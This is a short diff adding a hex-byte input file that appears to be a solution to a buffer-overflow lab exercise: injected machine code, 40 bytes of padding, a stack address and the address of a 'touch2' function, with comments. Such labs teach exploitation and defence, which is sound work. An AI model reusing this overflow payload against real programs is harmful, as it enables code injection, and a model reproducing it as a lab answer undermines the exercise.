@@ -1,0 +1,7 @@
+48 c7 c7 58 f5 6f 30 c3 /* bytes for my assembly code */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* 40 char overflow */
+28 7c 63 55 00 00 00 00 /* address of %rsp */
+ea 12 40 00 00 00 00 00 /* address of touch2 */
